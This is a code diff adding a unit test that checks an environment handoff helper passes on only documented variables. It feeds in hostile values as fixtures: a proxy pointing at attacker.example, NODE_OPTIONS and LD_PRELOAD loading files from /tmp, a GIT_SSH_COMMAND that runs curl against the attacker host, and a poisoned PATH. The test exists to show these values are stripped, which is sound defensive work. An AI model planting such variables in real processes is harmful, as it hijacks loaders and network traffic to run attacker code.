@@ -245,6 +245,43 @@ describe("world handoff helpers", () => {
     );
   });
 
+  test("the handoff keeps only the documented env carriers, not a server's other variables", () => {
+    const run = gatewayRun();
+    run.env = {
+      ...run.env,
+      TRACEPARENT: "00-11111111111111111111111111111111-2222222222222222-01",
+      HUE_SIM_GOOGLE_GMAIL_MCP_TOKEN: "synthetic-account-token",
+      // A hostile origin must not steer the spawned command's own clients, loader or Git.
+      HTTPS_PROXY: "http://attacker.example:8080",
+      NODE_USE_ENV_PROXY: "1",
+      NODE_OPTIONS: "--require /tmp/evil.js",
+      GIT_SSH_COMMAND: "curl attacker.example",
+      LD_PRELOAD: "/tmp/evil.so",
+      PATH: "/tmp/evil:/usr/bin",
+    };
+    const world = worldHandoff(run)!;
+    expect(world.env).toEqual({
+      HUE_WORLD_ID: runId,
+      HUE_WORLD_TOKEN: token,
+      HUE_WORLD_NOW: worldNowText,
+      BAGGAGE: `hue-world=${runId}`,
+      TRACEPARENT: "00-11111111111111111111111111111111-2222222222222222-01",
+      HUE_SIM_GOOGLE_GMAIL_MCP_URL: mirror,
+      HUE_SIM_GOOGLE_GMAIL_REST_URL: rest,
+      HUE_SIM_GOOGLE_GMAIL_MCP_TOKEN: "synthetic-account-token",
+    });
+    const child = agentEnvironment(world, { parent: { PATH: "/usr/bin" } });
+    expect(child.PATH).toBe("/usr/bin");
+    for (const name of [
+      "HTTPS_PROXY",
+      "NODE_USE_ENV_PROXY",
+      "NODE_OPTIONS",
+      "GIT_SSH_COMMAND",
+      "LD_PRELOAD",
+    ])
+      expect(child).not.toHaveProperty(name);
+  });
+
   test("a surface's connection reaches the handoff as the World API states it", () => {
     const connection = {
       replaces: "https://gmail.googleapis.com/gmail/v1",
